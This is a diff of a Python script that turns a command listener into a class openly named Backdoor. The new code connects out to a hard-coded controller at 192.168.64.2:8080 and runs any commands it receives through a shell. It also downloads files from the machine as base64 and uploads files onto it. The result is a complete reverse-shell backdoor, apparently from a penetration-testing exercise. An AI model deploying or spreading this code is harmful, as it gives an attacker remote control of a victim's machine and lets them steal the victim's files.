@@ -1,19 +1,21 @@
 import socket
 import json
+import subprocess
+import os
 import base64
 
-class Listener:
-    def init(self, ip, port):
-        lis = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        lis.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        lis.bind((ip, port))
-        lis.listen(0)
-        print(f"[+] Waiting for incoming connection.")
-        self.conn, addr = lis.accept()
-        print(f"[+] Got a connection {str(addr)}")
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.conn.connect((ip, port))
 
     def reliable_send(self, data):
-        json_data = json.dumps(data)
+        if isinstance(data, bytes):
+            message = base64.b64encode(data).decode()
+        else:
+            message = data
+        json_data = json.dumps(message)
         self.conn.send(json_data.encode())
 
     def reliable_receive(self):
@@ -25,42 +27,61 @@ class Listener:
             except ValueError:
                 continue
 
-    def execute_remotely(self, command):
-        self.reliable_send(command.encode())
+    def execute_system_command(self, command):
+        try:
+            result = subprocess.check_output(
+                command, shell=True, stderr=subprocess.STDOUT)
+            return result.decode()
+        except subprocess.CalledProcessError as e:
+            return e.output.decode()
 
+    def change_working_dir(self, path):
+        try:
+            os.chdir(path)
+            return "[+] Changing working directory."
+        except FileNotFoundError:
+            return "[-] Directory not found."
+
+    def read_file(self, path):
+        try:
+            with open(path, 'rb') as file:
+                return base64.b64encode(file.read()).decode()
+        except FileNotFoundError:
+            return "[-] File not found."
+
+    def write_file(self, path, content):
+        print('write_file')
+        try:
+            with open(path, 'wb') as file:
+                # Decode base64 to bytes
+                file.write(base64.b64decode(content.encode()))
+                return "[+] Upload successful."
+        except Exception as e:
+            return "[-] Upload failed: {}".format(str(e))
+
+    def handle_command(self, command):
         if command[0] == 'exit':
             self.conn.close()
             exit()
-        
-        return self.reliable_receive()
-
-    def read_file(self, path):
-        with open(path, 'rb') as file:
-            return base64.b64encode(file.read())
-    
-    def write_file(self, path, content):
-        with open(path, 'wb') as file:
-            file.write(base64.b64decode(content))
-            return "[+] Download successfully."
+        elif command[0] == 'cd' and len(command) > 1:
+            command_result = self.change_working_dir(command[1])
+        elif command[0] == 'download':
+            if len(command) > 1:
+                command_result = self.read_file(command[1])
+            else:
+                command_result = "Usage: download <file_path>"
+        elif command[0] == 'upload':
+            command_result = self.write_file(command[1], command[2])
+        else:
+            command_result = self.execute_system_command(command)
+        return command_result
 
     def run(self):
         while True:
-            command = input("[Enter a command] $ ")
-            command = command.split(" ")
-
-            try:
-                if command[0] == 'upload':
-                    file_content = self.read_file(command[1])
-                    command.append(file_content.decode())
-
-                result = self.execute_remotely(command)
-
-                if command[0] == 'download' and "[-] Error " not in result:
-                    result = self.write_file(command[1], result)
-            except Exception:
-                result = "[-] Error during command execution."
-            print(result)
+            command = self.reliable_receive()
+            command_result = self.handle_command(command)
+            self.reliable_send(command_result)
 
 
-my_listener = Listener("192.168.64.2", 8080)
-my_listener.run()
+my_backdoor = Backdoor('192.168.64.2', 8080)
+my_backdoor.run()
